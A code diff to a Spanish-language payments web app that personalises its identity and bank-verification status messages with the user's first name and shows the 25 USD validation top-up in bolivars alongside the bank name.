@@ -4286,7 +4286,7 @@
   <div class="verification-processing-content">
     <div class="verification-processing-title" id="verification-processing-title">Verificando Documentos</div>
     <div class="verification-processing-text" id="verification-processing-text">Estamos revisando su documentación. Este proceso puede tardar unos minutos.</div>
-    <div class="verification-note">Puedes cerrar sesión, no es necesario permanecer en línea. Puedes volver en cualquier momento.</div>
+    <div class="verification-note" id="verification-note">Puedes cerrar sesión, no es necesario permanecer en línea. Puedes volver en cualquier momento.</div>
     <div class="verification-progress-container" id="verification-progress-container" style="display:none;">
       <div class="verification-progress-bar" id="verification-progress-bar"></div>
     </div>
@@ -6102,13 +6102,17 @@ function updateVerificationToBankValidation() {
 function updateVerificationProcessingBanner() {
   const title = document.getElementById('verification-processing-title');
   const text = document.getElementById('verification-processing-text');
+  const note = document.getElementById('verification-note');
   const icon = document.getElementById('verification-processing-icon');
   const mainSpinner = document.getElementById('main-processing-spinner');
   const statusItems = document.getElementById('verification-status-items');
+  const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) :
+                     (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');
   
   if (verificationProcessing.currentPhase === 'documents') {
     if (title) title.textContent = 'Verificando Documentos';
     if (text) text.textContent = 'Estamos revisando su documentación. Este proceso puede tardar unos minutos.';
+    if (note) note.textContent = 'Puedes cerrar sesión, no es necesario permanecer en línea. Puedes volver en cualquier momento.';
     if (icon) {
       icon.className = 'verification-processing-icon';
       icon.innerHTML = '<i class="fas fa-id-card"></i>';
@@ -6118,7 +6122,8 @@ function updateVerificationProcessingBanner() {
     if (statusItems) statusItems.style.display = 'none';
   } else if (verificationProcessing.currentPhase === 'bank_validation') {
     if (title) title.textContent = '✓ Verificación en Progreso';
-    if (text) text.textContent = 'Hemos completado la verificación de sus documentos. Falta un último paso para activar todas las funciones.';
+    if (text) text.textContent = `${firstName ? firstName + ', ' : ''}hemos completado la verificación de tus documentos. Falta un último paso para activar todas las funciones.`;
+    if (note) note.textContent = `${firstName ? firstName + ', ' : ''}puedes cerrar sesión. No es necesario permanecer en línea y puedes volver en cualquier momento.`;
     if (icon) {
       icon.className = 'verification-processing-icon bank-phase';
       icon.innerHTML = '<i class="fas fa-shield-alt"></i>';
@@ -6138,6 +6143,10 @@ function updateVerificationProcessingBanner() {
         const account = banking.accountNumber ? 'Cuenta ' + banking.accountNumber : '';
         const idNum = verificationStatus.idNumber || currentUser.idNumber || '';
         bankInfo.textContent = `${bankName} | Cédula ${idNum} | ${account} | Pago Móvil y transferencias nacionales habilitados`;
+        const docSub = document.querySelector('#status-documents .status-sublabel');
+        if (docSub) docSub.textContent = `${firstName ? firstName + ', ' : ''}tus documentos de identidad fueron verificados y aprobados`;
+        const bankLabel = document.querySelector('#status-bank .status-label');
+        if (bankLabel) bankLabel.textContent = `${firstName ? firstName + ', tu cuenta de banco' : 'Cuenta de banco'} registrada con éxito`;
       }
 
       // Animar la aparición de los items de estado
@@ -6173,6 +6182,11 @@ function updateBankValidationStatusItem() {
   const sublabel = document.querySelector('#status-bank-validation .status-sublabel');
   const rechargeBtn = document.getElementById('start-recharge');
   const statusBtn = document.getElementById('view-status');
+  const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) :
+                     (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');
+  const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+  const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
+  const bankName = BANK_NAME_MAP[reg.primaryBank] || banking.bankName || '';
 
   if (verificationStatus.status === 'payment_validation') {
     if (label) label.textContent = 'Pago móvil en verificación';
@@ -6181,7 +6195,10 @@ function updateBankValidationStatusItem() {
     if (statusBtn) statusBtn.style.display = 'none';
   } else {
     if (label) label.textContent = 'Validación de datos de cuenta pendiente';
-    if (sublabel) sublabel.textContent = 'Para validar realiza una recarga por 25 USD desde tu cuenta registrada.';
+    if (sublabel) {
+      const bsAmount = (25 * CONFIG.EXCHANGE_RATES.USD_TO_BS).toFixed(2);
+      sublabel.textContent = `${firstName ? firstName + ', ' : ''}para validar realiza una recarga por 25 USD (${bsAmount} Bs) desde tu cuenta del ${bankName}. Como último paso, tus 25 USD se suman a tu saldo y podrás retirarlos a tu cuenta inmediatamente.`;
+    }
     if (rechargeBtn) rechargeBtn.style.display = 'inline-block';
     if (statusBtn) statusBtn.style.display = 'inline-block';
   }
